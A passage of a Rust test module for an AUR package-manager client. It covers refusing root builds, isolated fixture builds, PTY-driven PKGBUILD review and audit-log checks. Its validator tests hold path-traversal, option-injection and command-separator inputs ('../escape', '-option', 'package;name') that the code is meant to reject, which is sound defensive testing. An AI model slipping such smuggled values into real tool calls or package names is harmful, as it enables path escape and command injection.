            "add-file".as_ref(),
        ])
        .status
        .success()
    );
    assert!(
        git(&[
            "-C".as_ref(),
            seed.as_os_str(),
            "push".as_ref(),
            "origin".as_ref(),
            "HEAD".as_ref(),
        ])
        .status
        .success()
    );
    assert!(!checkout.join("new-file").exists());
    let client = AurClient {
        build_dir: temp.path().to_path_buf(),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    client
        .refresh_checkout_from(&checkout, remote.to_str().unwrap())
        .await
        .unwrap();
    assert_eq!(
        std::fs::read_to_string(checkout.join("new-file")).unwrap(),
        "from-origin\n"
    );
}

#[test]
fn aur_builds_reject_root_and_accept_an_unprivileged_user() {
    require_unprivileged_builder("example", false).expect("regular user");
    let error =
        require_unprivileged_builder("example", true).expect_err("root builds must be rejected");
    assert!(error.to_string().contains("must not be built as root"));
    assert!(error.to_string().contains("omg install example"));
}

#[test]
fn resolved_package_base_rejects_untrusted_path_and_option_syntax() {
    assert_eq!(
        AurClient::validated_package_base("output", Some("valid-base")).unwrap(),
        "valid-base"
    );
    assert!(AurClient::validated_package_base("output", Some("../escape")).is_err());
    assert!(AurClient::validated_package_base("output", Some("-option")).is_err());
}

#[test]
fn index_entry_names_are_validated_against_expected_packages() {
    validate_index_entry_name("valid-package", None).expect("valid index package");
    assert!(validate_index_entry_name("../escape", None).is_err());
    let error = validate_index_entry_name("different", Some("expected"))
        .expect_err("an exact lookup must reject a different package");
    assert!(error.to_string().contains("unexpected package 'different'"));
}

#[test]
fn search_query_validation_is_shared_by_all_aur_search_paths() {
    use crate::core::packages::search::MAX_SEARCH_QUERY_BYTES;
    assert!(validate_aur_search_query("normal package").is_ok());
    assert!(validate_aur_search_query(&"x".repeat(MAX_SEARCH_QUERY_BYTES)).is_ok());
    assert!(validate_aur_search_query(&"x".repeat(MAX_SEARCH_QUERY_BYTES + 1)).is_err());
    assert!(validate_aur_search_query("").is_err());
    assert!(validate_aur_search_query("   ").is_err());
    assert!(validate_aur_search_query("x").is_err());
    assert!(validate_aur_search_query("é").is_ok());
    assert!(validate_aur_search_query("package\nname").is_err());
    assert!(validate_aur_search_query("package\0name").is_err());
    assert!(validate_aur_search_query("../path").is_err());
    assert!(validate_aur_search_query("package;name").is_err());
}

#[tokio::test]
async fn detailed_search_rejects_a_short_query_before_rpc() {
    let error = search_detailed("x")
        .await
        .expect_err("a short AUR query must fail before an RPC request");
    assert_eq!(
        error.to_string(),
        "AUR search requires at least 2 non-whitespace bytes"
    );
}

#[test]
fn test_dependency_name_parses_constraints() {
    assert_eq!(dependency_name("simdutf-git"), "simdutf-git");
    assert_eq!(dependency_name("fast_float>=7.0"), "fast_float");
    assert_eq!(dependency_name("foo<2.0"), "foo");
    assert_eq!(dependency_name("bar=1.2.3"), "bar");
}

fn paired_fixture(name: &str, digest: &str) -> artifact_inspector::ArtifactInspection {
    artifact_inspector::ArtifactInspection {
        policy_version: artifact_inspector::INSPECTION_POLICY_VERSION,
        archive_sha256: digest.to_owned(),
        package_name: name.to_owned(),
        package_version: "1.0-1".to_owned(),
        package_base: "demo".to_owned(),
        architecture: "x86_64".to_owned(),
        member_count: 4,
        executable_files: Vec::new(),
        privileged_files: Vec::new(),
        install_hook: None,
        paired_build_reasons: vec!["system-configuration".to_owned()],
    }
}

#[test]
#[ignore = "requires native Arch build tools and explicitly isolated fixture state"]
fn native_isolated_fixture_builds_reviewed_source_without_installing() -> Result<()> {
    use std::collections::HashMap;

    use super::super::parallel_build::ParallelBuilder;

    anyhow::ensure!(
        matches!(
            std::env::var("OMG_AUR_NATIVE_FIXTURE").as_deref(),
            Ok("isolated-container" | "private-build")
        ),
        "native fixture requires explicitly isolated build state"
    );
    for variable in ["OMG_CACHE_DIR", "OMG_DATA_DIR", "OMG_CONFIG_DIR"] {
        anyhow::ensure!(
            std::env::var_os(variable).is_some_and(|path| Path::new(&path).is_absolute()),
            "native fixture requires an absolute private {variable}"
        );
    }
    anyhow::ensure!(
        !crate::core::is_root(),
        "native fixture must run unprivileged"
    );
    let cache = paths::cache_dir();
    std::fs::create_dir_all(&cache)?;
    let directory = tempfile::tempdir_in(&cache)?;
    let socket = directory.path().join("absent.sock");
    temp_env::with_vars(
        [
            ("CARGO_PRIMARY_PACKAGE", Some(std::ffi::OsStr::new("1"))),
            ("OMG_SOCKET_PATH", Some(socket.as_os_str())),
        ],
        || {
            tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()?
                .block_on(async {
                    let build_dir = directory.path().join("aur");
                    let checkout = build_dir.join("omg-coverage-fixture");
                    std::fs::create_dir_all(&checkout)?;
                    std::fs::write(
                        checkout.join("PKGBUILD"),
                        "pkgname=omg-coverage-fixture\npkgver=1\npkgrel=1\npkgdesc='Inert OMG coverage fixture'\narch=('any')\nlicense=('MIT')\npackage() { install -Dm644 /dev/null \"$pkgdir/usr/share/omg-coverage-fixture/empty\"; }\n",
                    ).expect("write fixture file");
                    std::fs::write(
                        checkout.join(".SRCINFO"),
                        "pkgbase = omg-coverage-fixture\n\tpkgdesc = Inert OMG coverage fixture\n\tpkgver = 1\n\tpkgrel = 1\n\tarch = any\n\tlicense = MIT\n\npkgname = omg-coverage-fixture\n",
                    ).expect("write fixture file");
                    let outputs = vec!["omg-coverage-fixture".to_owned()];
                    let source = ReviewedSource::capture(&checkout)?;
                    let dependencies = check_dependencies_from_metadata(source.required_srcinfo("fixture")?.as_ref(), &outputs)?;
                    anyhow::ensure!(
                        dependencies.missing.is_empty() && dependencies.package_outputs == outputs,
                        "fixture must never require dependency installation"
                    );
                    let mut settings = Settings::default();
                    settings.aur.security_profile = crate::config::AurSecurityProfile::Hardened;
                    let client = AurClient {
                        build_dir,
                        settings,
                        package_base_locks: Arc::new(dashmap::DashMap::new()),
                    };
                    let mut hashes = Vec::new();
                    for _ in 0..2 {
                        let authorized = AuthorizedBuild {
                            lifecycle_guard: client.acquire_build_lifecycle().await?,
                            package: "omg-coverage-fixture".to_owned(),
                            requested_outputs: outputs.clone(),
                            reviewed_digest: ReviewedSource::capture(&checkout)?,
                        };
                        let result = client
                            .install_authorized_package_outputs(authorized, None)
                            .await;
                        let log_path = client.build_log_path("omg-coverage-fixture");
                        let log = std::fs::read_to_string(&log_path);
                        let diagnostic = format!(
                            "Native fixture build log ({}):\n{log:?}",
                            log_path.display()
                        );
                        let archives = result.context(diagnostic)?;
                        assert_eq!(archives.len(), 1);
                        let inspected = artifact_inspector::inspect_archive(&archives.archives[0].path())?.into_inspection();
                        assert_eq!(inspected.package_name, "omg-coverage-fixture");
                        assert!(inspected.install_hook.is_none());
                        hashes.push(inspected.archive_sha256);
                    }
                    assert_eq!(
                        hashes[0], hashes[1],
                        "repeated admission preserves archive identity"
                    );
                    std::fs::write(
                        checkout.join("PKGBUILD"),
                        "pkgname=omg-coverage-fixture\npkgver=1\npkgrel=1\narch=('any')\npackage() { printf 'intentional-fixture-failure\\n' >&2; return 1; }\n",
                    ).expect("write fixture file");
                    let authorized = AuthorizedBuild {
                        lifecycle_guard: client.acquire_build_lifecycle().await?,
                        package: "omg-coverage-fixture".to_owned(),
                        requested_outputs: outputs,
                        reviewed_digest: ReviewedSource::capture(&checkout)?,
                    };
                    let error = client
                        .install_authorized_package_outputs(authorized, None)
                        .await
                        .expect_err("a failed recipe must not reuse previously accepted archives");
                    let diagnostic = format!("{error:#}");
                    let error_kind = error.downcast_ref::<AurError>();
                    let build_failed = matches!(error_kind, Some(AurError::BuildFailed { .. }));
                    assert!(build_failed, "{diagnostic}");
                    let log = std::fs::read_to_string(client.build_log_path("omg-coverage-fixture"))?;
                    assert!(log.contains("intentional-fixture-failure"), "{log}");

                    let success = "omg-coverage-wave-fixture";
                    let failure = "omg-coverage-fixture";
                    let success_checkout = client.build_dir.join(success);
                    std::fs::create_dir_all(&success_checkout)?;
                    std::fs::write(
                        success_checkout.join("PKGBUILD"),
                        "pkgname=omg-coverage-wave-fixture\npkgver=1\npkgrel=1\npkgdesc='Inert OMG parallel wave fixture'\narch=('any')\nlicense=('MIT')\npackage() { install -Dm644 /dev/null \"$pkgdir/usr/share/omg-coverage-wave-fixture/empty\"; printf 'wave-success-complete\\n' >&2; }\n",
                    )
                    .expect("write the successful parallel-wave fixture recipe");
                    std::fs::write(
                        success_checkout.join(".SRCINFO"),
                        "pkgbase = omg-coverage-wave-fixture\n\tpkgdesc = Inert OMG parallel wave fixture\n\tpkgver = 1\n\tpkgrel = 1\n\tarch = any\n\tlicense = MIT\n\npkgname = omg-coverage-wave-fixture\n",
                    )
                    .expect("write the successful parallel-wave fixture metadata");
                    let client = Arc::new(client);
                    let builder = ParallelBuilder::new(Arc::clone(&client), 2);
                    let empty = builder
                        .build_level(1, 1, &[], &HashMap::new(), &mut HashMap::new())
                        .await?;
                    assert_eq!(empty.succeeded_output_count(), 0);
                    assert_eq!(empty.failed_output_count(), 0);
                    assert_eq!(empty.skipped_output_count(), 0);
                    assert!(empty.failures().next().is_none());
                    assert!(empty.skipped_outputs().is_empty());

                    let packages = vec![failure.to_owned(), success.to_owned()];
                    let mut jobs = HashMap::new();
                    let mut authorizations = HashMap::new();
                    let success_source = ReviewedSource::capture(&success_checkout)?.digest;
                    for package in &packages {
                        let checkout = client.build_dir.join(package);
                        let outputs = vec![package.clone()];
                        let source = ReviewedSource::capture(&checkout)?;
                        let dependencies = check_dependencies_from_metadata(source.required_srcinfo("fixture")?.as_ref(), &outputs)?;
                        anyhow::ensure!(
                            dependencies.missing.is_empty() && dependencies.package_outputs == outputs,
                            "parallel fixture must never require dependency installation"
                        );
                        jobs.insert(package.clone(), BuildJob::new(package.clone(), Vec::new()));
                        authorizations.insert(
                            package.clone(),
                            AuthorizedBuild {
                                lifecycle_guard: client.acquire_build_lifecycle().await?,
                                package: package.clone(),
                                requested_outputs: outputs,
                                reviewed_digest: ReviewedSource::capture(&checkout)?,
                            },
                        );
                    }
                    std::fs::remove_file(client.build_log_path(failure))?;
                    let audit_path = paths::data_dir().join("audit/audit.jsonl");
                    let before = std::fs::read_to_string(&audit_path)?;
                    let error = builder
                        .build_level(1, 1, &packages, &jobs, &mut authorizations)
                        .await
                        .expect_err("a collected native archive must reach inert installation refusal");
                    assert!(authorizations.is_empty(), "both native jobs must be consumed");
                    assert!(
                        error.chain().any(|cause| {
                            cause.to_string().lines().next()
                                == Some("Privilege elevation not supported in development mode.")
                        }),
                        "{error:#}"
                    );
                    let success_log = std::fs::read_to_string(client.build_log_path(success))?;
                    assert!(success_log.contains("wave-success-complete"), "{success_log}");
                    let failure_log = std::fs::read_to_string(client.build_log_path(failure))?;
                    assert!(
                        failure_log.contains("intentional-fixture-failure"),
                        "{failure_log}"
                    );
                    let after = std::fs::read_to_string(audit_path)?;
                    let entries = after
                        .strip_prefix(&before)
                        .context("native fixture audit must retain the pre-wave prefix")?
                        .lines()
                        .map(serde_json::from_str::<crate::core::security::audit::AuditEntry>)
                        .collect::<std::result::Result<Vec<_>, _>>()?;
                    assert_eq!(
                        entries.iter().filter(|entry| {
                            entry.description.starts_with("Package operation aur_inspection: succeeded;")
                                && entry.resource.contains(&format!("source_manifest_sha256={success_source}"))
                                && entry.resource.contains(&format!("{success} 1-1 archive_sha256="))
                        }).count(),
                        2,
                        "both native archives must be inspected for the new wave source: {entries:?}"
                    );
                    assert!(
                        entries.iter().any(|entry| {
                            entry.description.starts_with("Package operation aur_paired_build: succeeded;")
                                && entry.resource.contains(&format!("source_manifest_sha256={success_source}"))
                                && entry.resource.contains(&format!("outputs={success}"))
                                && entry.resource.contains("result=exact-match")
                        }),
                        "successful wave fixture must complete independent exact-match verification: {entries:?}"
                    );
                    Ok(())
                })
        },
    )
}

#[test]
#[ignore = "requires the disposable, network-isolated Arch coverage container"]
fn native_isolated_history_requires_hardened_review() -> Result<()> {
    anyhow::ensure!(
        std::env::var("OMG_AUR_NATIVE_FIXTURE").as_deref() == Ok("isolated-container")
            && !crate::core::is_root(),
        "history fixture requires the unprivileged isolated container"
    );
    let output = std::process::Command::new(std::env::current_exe()?)
        .args([
            "--exact",
            "package_managers::aur::client::tests::attended_review_requires_hardened_confirmation_even_with_yes",
            "--nocapture",
        ])
        .env("OMG_AUR_HISTORY_FIXTURE", "1")
        .output()?;
    let diagnostic = format!(
        "history fixture failed:\n{}\n{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    anyhow::ensure!(output.status.success(), "{diagnostic}");
    Ok(())
}

#[tokio::test]
async fn attended_review_requires_hardened_confirmation_even_with_yes() -> Result<()> {
    if Settings::rerun_test_unprivileged(
        "package_managers::aur::client::tests::attended_review_requires_hardened_confirmation_even_with_yes",
    ) {
        return Ok(());
    }
    const MODE: &str = "OMG_AUR_REVIEW_PTY_MODE";
    if let Ok(mode) = std::env::var(MODE) {
        let history = matches!(
            mode.as_str(),
            "history" | "history-accept-failing-build" | "history-accept-rebuilt-archive"
        );
        let directory = if history {
            anyhow::ensure!(
                std::env::var("OMG_AUR_NATIVE_FIXTURE").as_deref() == Ok("isolated-container"),
                "historical fixture requires the isolated container"
            );
            anyhow::ensure!(
                std::env::var_os("OMG_CACHE_DIR")
                    .is_some_and(|path| Path::new(&path).is_absolute()),
                "historical fixture requires an absolute private cache"
            );
            let cache = paths::cache_dir();
            std::fs::create_dir_all(&cache).expect("create private fixture cache");
            tempfile::tempdir_in(cache)?
        } else {
            tempfile::tempdir()?
        };
        let pkgbuild = directory.path().join("PKGBUILD");
        std::fs::write(&pkgbuild, "pkgname=demo\n").expect("write fixture file");
        std::fs::write(directory.path().join(".SRCINFO"), "pkgbase = demo\n")
            .expect("write fixture file");
        crate::core::privilege::set_yes_flag(true);
        let profile = match mode.as_str() {
            "standard" | "authorize" => crate::config::AurSecurityProfile::Standard,
            _ => crate::config::AurSecurityProfile::Hardened,
        };
        if history {
            let mut settings = Settings::default();
            settings.aur.security_profile = profile;
            let client = AurClient {
                build_dir: directory.path().join("build"),
                settings,
                package_base_locks: Arc::new(dashmap::DashMap::new()),
            };
            let error = client
                .downgrade_from_history("demo", "1-1")
                .await
                .expect_err("historical fixture must not install a package");
            if mode == "history" {
                assert!(
                    error.to_string().contains("Build aborted by user"),
                    "{error:#}"
                );
                println!("REVIEW_DECLINED");
            } else if mode == "history-accept-failing-build" {
                assert!(
                    error
                        .to_string()
                        .contains("Historical build of demo 1-1 failed"),
                    "{error:#}"
                );
                let log = std::fs::read_to_string(client.build_log_path("demo"))?;
                assert!(log.contains("intentional-history-fixture-failure"), "{log}");
                println!("HISTORY_BUILD_FAILED");
            } else {
                assert!(
                    error.chain().any(|cause| {
                        cause.to_string().lines().next()
                            == Some("Privilege elevation not supported in development mode.")
                    }),
                    "rebuilt archive must reach the installation boundary: {error:#}"
                );
                let audit = std::fs::read_to_string(paths::data_dir().join("audit/audit.jsonl"))
                    .expect("read the isolated rollback audit log");
                let entries = audit
                    .lines()
                    .map(serde_json::from_str::<crate::core::security::audit::AuditEntry>)
                    .collect::<std::result::Result<Vec<_>, _>>()
                    .expect("parse the rollback audit records");
                assert!(
                    entries.iter().any(|entry| {
                        entry
                            .description
                            .starts_with("Package operation aur_paired_build: succeeded;")
                            && entry.resource.contains("outputs=demo")
                            && entry.resource.contains("result=exact-match")
                    }),
                    "the historical archive must reproduce exactly: {entries:?}"
                );
                println!("HISTORY_ARCHIVE_VERIFIED");
            }
        } else if mode == "authorize" {
            let client = AurClient {
                build_dir: directory.path().join("build"),
                settings: Settings::default(),
                package_base_locks: Arc::new(dashmap::DashMap::new()),
            };
            let authorized = client
                .authorize_package_outputs("demo", &["demo".to_owned()])
                .await?;
            authorized
                .reviewed_digest
                .verify(&client.build_dir.join("demo"))?;
            println!("REVIEW_ACCEPTED");
        } else {
            let result = AurClient::review_pkgbuild("demo", &pkgbuild, profile).await;
            if mode == "standard" {
                result?.verify(directory.path())?;
                println!("REVIEW_ACCEPTED");
            } else {
                let error = result.expect_err("declining hardened review must abort");
                assert!(
                    error.to_string().contains("Build aborted by user"),
                    "{error:#}"
                );
                println!("REVIEW_DECLINED");
            }
        }
        return Ok(());
    }

    // The child owns its terminal and global --yes flag. Input is sent only
    // after the prompt appears, so an unexpected skipped prompt fails.
    let driver = r#"
import errno, os, pty, select, shutil, signal, subprocess, sys, tempfile, time
mode, executable, test_name = sys.argv[1:]
os.environ['OMG_AUR_REVIEW_PTY_MODE'] = mode
fixture = tempfile.mkdtemp(prefix='omg-review-pty-')
with open(os.path.join(fixture, 'git'), 'w') as script:
    script.write('''#!/bin/sh
set -eu
sha=0123456789abcdef0123456789abcdef01234567
if [ "$1" = clone ] && [ "$#" -eq 5 ] && [ "$2" = --filter=blob:none ] && [ "$3" = -- ] && [ "$4" = https://aur.archlinux.org/demo.git ]; then
    case "$5" in */_rollback/demo-*) exit 0;; *) exit 1;; esac
fi
if [ "$#" -ge 4 ] && [ "$1" = -C ]; then
    case "$2" in */_rollback/demo-*) ;; *) exit 1;; esac
    if [ "$#" -eq 6 ] && [ "$3" = log ] && [ "$4" = --no-show-signature ] && [ "$5" = --format=%H ] && [ "$6" = --max-count=10001 ]; then
        printf '%s\\n' "$sha"
        exit 0
    fi
    if [ "$#" -eq 4 ] && [ "$3" = show ] && [ "$4" = "${sha}:.SRCINFO" ]; then
        printf 'pkgbase = demo\\npkgver = 1\\npkgrel = 1\\narch = any\\npkgname = demo\\n'
        exit 0
    fi
    if [ "$#" -eq 5 ] && [ "$3" = checkout ] && [ "$4" = --detach ] && [ "$5" = "$sha" ]; then
        printf 'pkgname=demo\\npkgver=1\\npkgrel=1\\narch=(any)\\n' > "$2/PKGBUILD"
        if [ "$OMG_AUR_REVIEW_PTY_MODE" = history-accept-rebuilt-archive ]; then
            printf 'pkgdesc="Inert historical release fixture"\\nlicense=(MIT)\\npackage() { install -Dm644 /dev/null "$pkgdir/usr/share/demo/empty"; }\\n' >> "$2/PKGBUILD"
        else
            printf 'package() { printf "intentional-history-fixture-failure\\\\n" >&2; return 1; }\\n' >> "$2/PKGBUILD"
        fi
        printf 'pkgbase = demo\\npkgver = 1\\npkgrel = 1\\narch = any\\npkgname = demo\\n' > "$2/.SRCINFO"
        exit 0
    fi
    exit 1
fi
[ "$#" -eq 6 ] && [ "$1" = clone ] && [ "$2" = --depth=1 ] && [ "$3" = --filter=blob:none ] && [ "$4" = -- ] && [ "$5" = https://aur.archlinux.org/demo.git ]
mkdir "$6"
printf 'pkgname=demo\\n' > "$6/PKGBUILD"
printf 'pkgbase = demo\\n' > "$6/.SRCINFO"
''')
os.chmod(os.path.join(fixture, 'git'), 0o700)
if mode == 'git-contract':
    try:
        checkout = os.path.join(fixture, '_rollback', 'demo-contract')
        os.makedirs(checkout)
        git = os.path.join(fixture, 'git')
        sha = '0123456789abcdef0123456789abcdef01234567'
        bounded_log = ['log', '--no-show-signature', '--format=%H', '--max-count=10001']
        commands = [
            (bounded_log, True),
            (['log', '--format=%H'], False),
            (bounded_log[:-1], False),
            (['log', '--format=%H', '--max-count=10001'], False),
            (bounded_log[:-1] + ['--max-count=10002'], False),
            (['show', sha + ':.SRCINFO'], True),
            (['show', 'fixture-commit:.SRCINFO'], False),
            (['checkout', '--detach', sha], True),
            (['checkout', '--detach', 'fixture-commit'], False),
        ]
        for arguments, accepted in commands:
            result = subprocess.run([git, '-C', checkout] + arguments,
                                    capture_output=True, timeout=5)
            if (result.returncode == 0) != accepted:
                raise RuntimeError('Git fixture contract mismatch for ' + repr(arguments) +
                                   ': status=' + str(result.returncode) +
                                   ' stderr=' + repr(result.stderr))
            if arguments == bounded_log and result.stdout != (sha + '\n').encode():
                raise RuntimeError('Git fixture must emit one full commit ID: ' + repr(result.stdout))
            if arguments == ['show', sha + ':.SRCINFO'] and b'pkgver = 1\n' not in result.stdout:
                raise RuntimeError('Git fixture must emit historical metadata: ' + repr(result.stdout))
        with open(os.path.join(checkout, 'PKGBUILD')) as recipe:
            if 'intentional-history-fixture-failure' not in recipe.read():
                raise RuntimeError('Git fixture must preserve the intentional build failure')
        print('GIT_FIXTURE_CONTRACT_PASSED ' + str(len(commands)) + ' commands')
    finally:
        shutil.rmtree(fixture)
    sys.exit(0)
pid, fd = pty.fork()
if pid == 0:
    os.environ['PATH'] = fixture + ':/usr/bin:/bin'
    if mode == 'history-accept-rebuilt-archive':
        os.environ['CARGO_PRIMARY_PACKAGE'] = '1'
        os.environ['OMG_DATA_DIR'] = fixture
        os.environ['OMG_SOCKET_PATH'] = os.path.join(fixture, 'absent.sock')
    os.execv(executable, [executable, '--exact', test_name, '--nocapture'])
approval = {
    'hardened': (b'n\n', b'REVIEW_DECLINED'),
    'history': (b'n\n', b'REVIEW_DECLINED'),
    'history-accept-failing-build': (b'y\n', b'HISTORY_BUILD_FAILED'),
    'history-accept-rebuilt-archive': (b'y\n', b'HISTORY_ARCHIVE_VERIFIED'),
}.get(mode)
output = bytearray()
sent = False
deadline = time.monotonic() + 45
status = None
try:
    while time.monotonic() < deadline:
        readable, _, _ = select.select([fd], [], [], 0.1)
        if readable:
            try:
                chunk = os.read(fd, 4096)
            except OSError as error:
                if error.errno != errno.EIO:
                    raise
                chunk = b''
            output.extend(chunk)
            if len(output) > 1024 * 1024:
                raise RuntimeError('review output exceeded limit')
            if approval and not sent and b'Build demo from this PKGBUILD?' in output:
                os.write(fd, approval[0])
                sent = True
        done, child_status = os.waitpid(pid, os.WNOHANG)
        if done:
            status = child_status
            while True:
                try:
                    chunk = os.read(fd, 4096)
                except OSError as error:
                    if error.errno != errno.EIO:
                        raise
                    break
                if not chunk:
                    break
                output.extend(chunk)
                if len(output) > 1024 * 1024:
                    raise RuntimeError('review output exceeded limit')
            break
    else:
        raise RuntimeError('review child timed out')
    expected = approval[1] if approval else b'REVIEW_ACCEPTED'
    if (os.waitstatus_to_exitcode(status) != 0 or expected not in output or
            (approval and not sent) or
            (expected != b'REVIEW_DECLINED' and b'REVIEW_DECLINED' in output)):
        raise RuntimeError('review child failed or did not show the expected prompt')
finally:
    if status is None:
        os.kill(pid, signal.SIGKILL)
        os.waitpid(pid, 0)
    os.close(fd)
    shutil.rmtree(fixture)
    sys.stdout.buffer.write(output)
"#;
    let mut modes = vec!["git-contract", "standard", "hardened", "authorize"];
    if std::env::var("OMG_AUR_HISTORY_FIXTURE").as_deref() == Ok("1") {
        modes.extend([
            "history",
            "history-accept-failing-build",
            "history-accept-rebuilt-archive",
        ]);
    }
    for mode in modes {
        let output = std::process::Command::new("python3")
            .args(["-c", driver, mode])
            .arg(std::env::current_exe()?)
            .arg("package_managers::aur::client::tests::attended_review_requires_hardened_confirmation_even_with_yes")
            .output()?;
        let diagnostic = format!(
            "{mode} review fixture failed:\n{}\n{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        );
        assert!(output.status.success(), "{diagnostic}");
    }
    Ok(())
}

#[tokio::test]
#[ignore = "requires the disposable, network-isolated Arch coverage container"]
async fn native_isolated_dynamic_history_pairs_reviewed_source() -> Result<()> {
    const CASE: &str = "package_managers::aur::client::tests::native_isolated_dynamic_history_pairs_reviewed_source";
    const CHILD: &str = "OMG_AUR_DYNAMIC_HISTORY_FIXTURE_DIR";
    anyhow::ensure!(
        std::env::var("OMG_AUR_NATIVE_FIXTURE").as_deref() == Ok("isolated-container")
            && !crate::core::is_root(),
        "dynamic history fixture requires the unprivileged isolated container"
    );
    if let Some(fixture) = std::env::var_os(CHILD) {
        let mut settings = Settings::default();
        settings.aur.security_profile = AurSecurityProfile::Hardened;
        let client = AurClient {
            build_dir: PathBuf::from(fixture).join("build"),
            settings,
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let rebuilt = client
            .rebuild_from_history_with_install("demo", "1-1", async |batches, _| {
                assert_eq!(batches.len(), 1);
                assert_eq!(batches[0].len(), 1);
                Ok(())
            })
            .await?;
        assert_eq!(rebuilt, "2-1");
        println!("HISTORY_DYNAMIC_VERSION_VERIFIED");
        return Ok(());
    }

    let fixture = tempfile::tempdir_in(paths::cache_dir())?;
    let repo = fixture.path().join("source");
    std::fs::create_dir(&repo)?;
    let pkgbuild = "pkgname=demo\npkgver=1\npkgrel=1\narch=(any)\npkgdesc='Historical release fixture'\nlicense=(MIT)\npkgver() { echo 2; }\npackage() { install -Dm644 /dev/null \"$pkgdir/usr/share/demo/empty\"; }\n";
    let srcinfo = "pkgbase = demo\n\tpkgver = 1\n\tpkgrel = 1\n\tarch = any\n\npkgname = demo\n";
    std::fs::write(repo.join("PKGBUILD"), pkgbuild)?;
    std::fs::write(repo.join(".SRCINFO"), srcinfo)?;
    let git = crate::core::privilege::root_controlled_program_path("git")?;
    let run_git = |args: &[&str]| -> Result<()> {
        let output = std::process::Command::new(&git)
            .current_dir(&repo)
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .args(args)
            .output()?;
        let stderr = String::from_utf8_lossy(&output.stderr);
        anyhow::ensure!(
            output.status.success(),
            "fixture git {args:?} failed: {stderr}"
        );
        Ok(())
    };
    run_git(&["init", "--quiet", "--template="])?;
    run_git(&["add", "--", "PKGBUILD", ".SRCINFO"])?;
    run_git(&[
        "-c",
        "user.name=Fixture",
        "-c",
        "user.email=fixture@example.invalid",
        "commit",
        "--quiet",
        "--message",
        "Historical package fixture",
    ])?;
    let git_config_path = fixture.path().join("gitconfig");
    let git_config = format!(
        "[url \"file://{}\"]\n\tinsteadOf = https://aur.archlinux.org/demo.git\n",
        repo.display(),
    );
    std::fs::write(&git_config_path, git_config)?;

    let terminal_driver = r"
import errno, os, pty, select, signal, sys, time

pid, fd = pty.fork()
if pid == 0:
os.execv(sys.argv[1], sys.argv[1:])

output = bytearray()
approved = False
reaped = False
deadline = time.monotonic() + 25
try:
while time.monotonic() < deadline:
    if not select.select([fd], [], [], 0.1)[0]:
        continue
    try:
        data = os.read(fd, 4096)
    except OSError as error:
        if error.errno != errno.EIO:
            raise
        break
    if not data:
        break
    output.extend(data)
    if len(output) > 1024 * 1024:
        raise RuntimeError('dynamic history fixture output exceeded limit')
    if not approved and b'Build demo from this PKGBUILD?' in output:
        os.write(fd, b'y\n')
        approved = True
else:
    raise RuntimeError('dynamic history review timed out')
_, status = os.waitpid(pid, 0)
reaped = True
if (os.waitstatus_to_exitcode(status) != 0 or not approved
        or b'Installing demo 2-1' not in output
        or b'HISTORY_DYNAMIC_VERSION_VERIFIED' not in output):
    raise RuntimeError('dynamic history review did not reach the approved install boundary')
finally:
if not reaped:
    os.kill(pid, signal.SIGKILL)
    os.waitpid(pid, 0)
os.close(fd)
sys.stdout.buffer.write(output)
";
    let output = std::process::Command::new("python3")
        .args(["-c", terminal_driver])
        .arg(std::env::current_exe()?)
        .args(["--exact", CASE, "--include-ignored", "--nocapture"])
        .env(CHILD, fixture.path())
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_CONFIG_GLOBAL", git_config_path)
        .env("CARGO_PRIMARY_PACKAGE", "1")
        .env("OMG_DATA_DIR", fixture.path())
        .env("OMG_SOCKET_PATH", fixture.path().join("absent.sock"))
        .output()?;
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    anyhow::ensure!(
        output.status.success(),
        "dynamic history fixture failed:\n{stdout}\n{stderr}"
    );
    println!("{stdout}");
    Ok(())
}

fn with_private_admission_fixture(
    test: &str,
    body: impl FnOnce(&tokio::runtime::Runtime, &Path) -> Result<()>,
) -> Result<()> {
    if Settings::rerun_test_unprivileged(test) || crate::core::testing::run_isolated_test(test) {
        return Ok(());
    }
    let fixture = private_fixture_dir()?;
    let configuration = fixture.path().join("config");
    let data = fixture.path().join("data");
    let cache = fixture.path().join("cache");
    let socket = fixture.path().join("absent.sock");
    for directory in [&configuration, &data, &cache] {
        std::fs::create_dir(directory)?;
    }
    temp_env::with_vars(
        [
            ("OMG_CONFIG_DIR", Some(configuration.as_os_str())),
            ("OMG_DATA_DIR", Some(data.as_os_str())),
            ("OMG_CACHE_DIR", Some(cache.as_os_str())),
            ("OMG_SOCKET_PATH", Some(socket.as_os_str())),
            ("CARGO_PRIMARY_PACKAGE", Some(std::ffi::OsStr::new("1"))),
        ],
        || {
            std::fs::write(
                configuration.join("config.toml"),
                "[aur]\nsecurity_profile = 'standard'\n",
            )
            .expect("write the isolated Standard AUR profile");
            let runtime = tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()?;
            body(&runtime, fixture.path())
        },
    )
}

#[test]
fn archive_admission_enforces_profile_and_binds_paired_cache_to_it() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::archive_admission_enforces_profile_and_binds_paired_cache_to_it";
    with_private_admission_fixture(TEST, |runtime, fixture| {
        runtime.block_on(async {
            let checkout = tempfile::tempdir_in(fixture)?;
            std::fs::write(checkout.path().join("PKGBUILD"), "pkgname=demo\n")
                .expect("write fixture file");
            std::fs::write(
                checkout.path().join(".SRCINFO"),
                "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\ninstall = demo.install\npkgname = demo\n",
            )
            .expect("write fixture file");
            let hook = "post_install() { :; }\n";
            std::fs::write(checkout.path().join("demo.install"), hook).expect("write fixture file");
            let source = ReviewedSource::capture(checkout.path())?;
            let archives = tempfile::Builder::new()
                .permissions(std::fs::Permissions::from_mode(0o700))
                .tempdir_in(fixture)?;
            let archive = archives.path().join("demo-1-1-any.pkg.tar.gz");
            let info = "pkgname = demo\npkgbase = demo\npkgver = 1-1\n";
            write_pkg_archive(&archive, info, Some(hook));
            let invocation = tempfile::tempdir_in(fixture)?;
            let env = MakepkgEnv {
                pkgdest: invocation.path().join("pkg"),
                srcdest: invocation.path().join("src"),
                builddir: invocation.path().join("build"),
                _invocation: invocation,
